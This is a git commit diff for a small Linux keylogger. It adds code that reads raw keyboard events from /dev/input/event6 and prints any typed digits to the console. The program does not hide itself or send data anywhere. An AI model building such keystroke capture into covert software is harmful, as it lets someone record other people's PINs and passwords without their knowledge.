779dab98c10620bb4898dca2e6f9f359f36d3959
José Valter Silva Carneiro <git@josevaltersilvacarneiro.net>
2023-02-26 19:54:55 -0300

    Now every number is recognized and displayed

--- src/keylog.cpp
+++ src/keylog.cpp
@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <iostream>
+#include <vector>
 #include <ctime>
 
 /* See https://manpages.ubuntu.com/manpages/impish/man3/timeval.3bsd.html */
@@ -20,13 +21,102 @@ using namespace std;
 
 #define FILENAME "/dev/input/event6"
 
-typedef struct input_event KEYBOARD;
+vector<unsigned short> syns;		/* It stores signals */
+
+bool
+is_in_syns(unsigned short code)
+{
+	/*
+	 * This function goes through the array
+	 * and finds out if the `code` has
+	 * already been stored.
+	 */
+
+	for (unsigned short _code : syns) {
+		if (code == _code)
+			return true;
+	}
+
+	return false;
+}
+
+void
+push_syn(unsigned short code)
+{
+	/* 
+	 * It stores the signal indicating that
+	 * it's being pressed.
+	 */
+
+	if (!is_in_syns(code))
+		syns.push_back(code);
+}
+
+char
+get_typed_letter(unsigned short code)
+{
+	char ch = '\0';
+
+	switch (code) {
+		case KEY_1:
+		case KEY_KP1:
+			ch = '1';
+			break;
+		case KEY_2:
+		case KEY_KP2:
+			ch = '2';
+			break;
+		case KEY_3:
+		case KEY_KP3:
+			ch = '3';
+			break;
+		case KEY_4:
+		case KEY_KP4:
+			ch = '4';
+			break;
+		case KEY_5:
+		case KEY_KP5:
+			ch = '5';
+			break;
+		case KEY_6:
+		case KEY_KP6:
+			ch = '6';
+			break;
+		case KEY_7:
+		case KEY_KP7:
+			ch = '7';
+			break;
+		case KEY_8:
+		case KEY_KP8:
+			ch = '8';
+			break;
+		case KEY_9:
+		case KEY_KP9:
+			ch = '9';
+			break;
+		case KEY_0:
+		case KEY_KP0:
+			ch = '0';
+			break;
+	}
+
+	return ch;
+}
+
+void
+delete_syn(unsigned short code)
+{
+	for (register int i = 0; i < syns.size(); i++)
+		if (code == syns.at(i))
+			syns.at(i) = 0;
+}
 
 int
 main(int argc, char *argv[])
 {
-	FILE    *fp;
-	KEYBOARD keyboard;
+	FILE  *fp;
+	struct input_event event;
+	char   ch;
 
 	fp = fopen(FILENAME, "rb");
 
@@ -39,13 +129,28 @@ main(int argc, char *argv[])
 
 		/* Puts the file pointer to the last sizeof(KEYBOARD) bytes */
 
-		fseek(fp, -sizeof(KEYBOARD), SEEK_END);
+		fseek(fp, -sizeof(struct input_event), SEEK_END);
 
-		if (fread(&keyboard, sizeof(KEYBOARD), 1, fp) != 1) {
+		if (fread(&event, sizeof(struct input_event), 1, fp) != 1) {
 			if (!feof(fp))
 				cout << "File read error" << endl;
 		}
 
+		if (event.type == EV_KEY) /* Key Event */
+			switch (event.value) {
+				case EV_SYN:
+					push_syn(event.code);
+					break;
+				case EV_KEY:
+					ch = get_typed_letter(event.code);
+					if (ch != '\0')
+						cout << ch << endl;
+					break;
+				case EV_REL:
+					delete_syn(event.code);
+					break;
+			}
+/*
 		if (keyboard.type == EV_KEY && keyboard.value == EV_KEY) {
 
 			switch (keyboard.code) {
@@ -56,7 +161,7 @@ main(int argc, char *argv[])
 					cout << "b" << endl;
 					break;
 			}
-		}
+		}*/
 		/*
 		cout << "Time: "   << keyboard.time.tv_sec << endl;
 		cout << "Type: "   << keyboard.type << endl;
